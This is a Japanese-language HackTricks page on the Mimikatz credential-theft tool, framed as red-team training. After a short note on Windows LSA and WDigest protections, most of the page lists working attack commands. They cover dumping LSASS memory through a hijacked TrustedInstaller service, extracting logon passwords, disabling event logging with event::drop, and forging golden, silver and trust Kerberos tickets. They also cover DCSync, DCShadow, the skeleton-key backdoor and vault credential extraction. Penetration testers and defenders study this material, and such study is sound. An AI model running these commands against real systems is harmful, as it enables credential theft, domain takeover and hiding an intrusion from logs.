# Mimikatz

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}


**このページは [adsecurity.org](https://adsecurity.org/?page\_id=1821) のものに基づいています**。詳細については元のページを確認してください！

## LM とメモリ内の平文

Windows 8.1 および Windows Server 2012 R2 以降、資格情報の盗難を防ぐために重要な対策が実施されています：

- **LM ハッシュと平文パスワード**は、セキュリティを強化するためにメモリに保存されなくなりました。特定のレジストリ設定、_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ を DWORD 値 `0` に設定してダイジェスト認証を無効にし、「平文」パスワードが LSASS にキャッシュされないようにする必要があります。

- **LSA 保護**は、ローカル セキュリティ アuthority (LSA) プロセスを不正なメモリ読み取りやコード注入から保護するために導入されました。これは、LSASS を保護されたプロセスとしてマークすることによって実現されます。LSA 保護を有効にするには：
1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ のレジストリを変更し、`RunAsPPL` を `dword:00000001` に設定します。
2. 管理されたデバイス全体でこのレジストリ変更を強制するグループ ポリシー オブジェクト (GPO) を実装します。

これらの保護にもかかわらず、Mimikatz のようなツールは特定のドライバーを使用して LSA 保護を回避することができますが、そのような行動はイベントログに記録される可能性が高いです。

### SeDebugPrivilege 削除への対抗

管理者は通常 SeDebugPrivilege を持っており、プログラムをデバッグすることができます。この特権は、不正なメモリダンプを防ぐために制限されることがあり、これは攻撃者がメモリから資格情報を抽出するために使用する一般的な手法です。しかし、この特権が削除されても、TrustedInstaller アカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行できます：
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
これにより、`lsass.exe` メモリをファイルにダンプすることができ、その後別のシステムで分析して資格情報を抽出できます：
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Mimikatzにおけるイベントログの改ざんは、主に2つのアクションを含みます：イベントログのクリアと新しいイベントのログ記録を防ぐためのイベントサービスのパッチ。以下は、これらのアクションを実行するためのコマンドです：

#### Clearing Event Logs

- **Command**: このアクションは、イベントログを削除することを目的としており、悪意のある活動を追跡することを難しくします。
- Mimikatzは、コマンドラインを介してイベントログを直接クリアするための直接的なコマンドを標準ドキュメントに提供していません。しかし、イベントログの操作は通常、特定のログをクリアするためにMimikatzの外部でシステムツールやスクリプトを使用することを含みます（例：PowerShellやWindows Event Viewerを使用）。

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- この実験的なコマンドは、イベントログサービスの動作を変更するように設計されており、新しいイベントの記録を効果的に防ぎます。
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug`コマンドは、Mimikatzがシステムサービスを変更するために必要な特権で動作することを保証します。
- 次に、`event::drop`コマンドがイベントログサービスをパッチします。


### Kerberos Ticket Attacks

### Golden Ticket Creation

ゴールデンチケットは、ドメイン全体のアクセスのなりすましを可能にします。主なコマンドとパラメータ：

- Command: `kerberos::golden`
- Parameters:
- `/domain`: ドメイン名。
- `/sid`: ドメインのセキュリティ識別子（SID）。
- `/user`: なりすますユーザー名。
- `/krbtgt`: ドメインのKDCサービスアカウントのNTLMハッシュ。
- `/ptt`: チケットをメモリに直接注入します。
- `/ticket`: 後で使用するためにチケットを保存します。

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Ticketsは特定のサービスへのアクセスを許可します。主なコマンドとパラメータ：

- コマンド：Golden Ticketに似ていますが、特定のサービスをターゲットにします。
- パラメータ：
- `/service`：ターゲットとするサービス（例：cifs、http）。
- その他のパラメータはGolden Ticketに似ています。

例：
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Ticketsは、信頼関係を利用してドメイン間でリソースにアクセスするために使用されます。主なコマンドとパラメータ：

- Command: Golden Ticketに似ていますが、信頼関係用です。
- Parameters:
- `/target`: 対象ドメインのFQDN。
- `/rc4`: 信頼アカウントのNTLMハッシュ。

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### 追加のKerberosコマンド

- **チケットのリスト**:
- コマンド: `kerberos::list`
- 現在のユーザーセッションのすべてのKerberosチケットをリストします。

- **キャッシュをパスする**:
- コマンド: `kerberos::ptc`
- キャッシュファイルからKerberosチケットを注入します。
- 例: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **チケットをパスする**:
- コマンド: `kerberos::ptt`
- 別のセッションでKerberosチケットを使用できるようにします。
- 例: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **チケットを消去する**:
- コマンド: `kerberos::purge`
- セッションからすべてのKerberosチケットをクリアします。
- チケット操作コマンドを使用する前に、競合を避けるために便利です。

### Active Directoryの改ざん

- **DCShadow**: ADオブジェクト操作のために一時的にマシンをDCとして機能させます。
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: DCを模倣してパスワードデータを要求します。
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### 資格情報アクセス

- **LSADUMP::LSA**: LSAから資格情報を抽出します。
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: コンピュータアカウントのパスワードデータを使用してDCを偽装します。
- *元の文脈ではNetSyncのための特定のコマンドは提供されていません。*

- **LSADUMP::SAM**: ローカルSAMデータベースにアクセスします。
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: レジストリに保存された秘密を復号化します。
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: ユーザーの新しいNTLMハッシュを設定します。
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: 信頼認証情報を取得します。
- `mimikatz "lsadump::trust" exit`

### その他

- **MISC::Skeleton**: DC上のLSASSにバックドアを注入します。
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### 権限昇格

- **PRIVILEGE::Backup**: バックアップ権限を取得します。
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: デバッグ権限を取得します。
- `mimikatz "privilege::debug" exit`

### 資格情報ダンプ

- **SEKURLSA::LogonPasswords**: ログオン中のユーザーの資格情報を表示します。
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: メモリからKerberosチケットを抽出します。
- `mimikatz "sekurlsa::tickets /export" exit`

### SIDとトークンの操作

- **SID::add/modify**: SIDとSIDHistoryを変更します。
- 追加: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- 修正: *元の文脈では修正のための特定のコマンドは提供されていません。*

- **TOKEN::Elevate**: トークンを偽装します。
- `mimikatz "token::elevate /domainadmin" exit`

### ターミナルサービス

- **TS::MultiRDP**: 複数のRDPセッションを許可します。
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDPセッションをリストします。
- *元の文脈ではTS::Sessionsのための特定のコマンドは提供されていません。*

### ボールト

- Windows Vaultからパスワードを抽出します。
- `mimikatz "vault::cred /patch" exit`


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**モバイルセキュリティ**の専門知識を深めるために8kSecアカデミーをご利用ください。自己ペースのコースを通じてiOSとAndroidのセキュリティをマスターし、認定を取得しましょう：

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter**で**フォロー**してください** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
